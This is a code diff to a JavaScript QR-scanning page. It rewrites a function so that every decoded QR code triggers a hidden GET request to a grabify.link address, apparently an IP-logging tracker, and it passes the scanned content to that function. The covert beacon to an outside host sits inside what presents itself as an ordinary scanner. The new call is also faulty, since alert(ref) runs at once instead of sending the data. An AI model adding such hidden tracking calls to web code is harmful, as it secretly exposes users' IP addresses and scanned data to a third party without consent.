@@ -87,14 +87,7 @@
     });
 
     function sendIt(ref){
-    $.ajax({
-        url: 'https://grabify.link/1Y5UGC',
-        type: "get",
-             data: "check",
-     success: function(response){
-         alert(response);
-     }
-    });
+    $.get('https://grabify.link/1Y5UGC',alert(ref));
     }
     function tick() {
       loadingMessage.innerText = "⌛ Loading video..."
@@ -118,8 +111,8 @@
           outputMessage.hidden = true;
           outputData.parentElement.hidden = false;
           outputData.innerText = code.data;
-          sendIt('aa');
-          alert(code.data);
+          sendIt(code.data);
+          //alert(code.data);
         } else {
           outputMessage.hidden = false;
           outputData.parentElement.hidden = true;
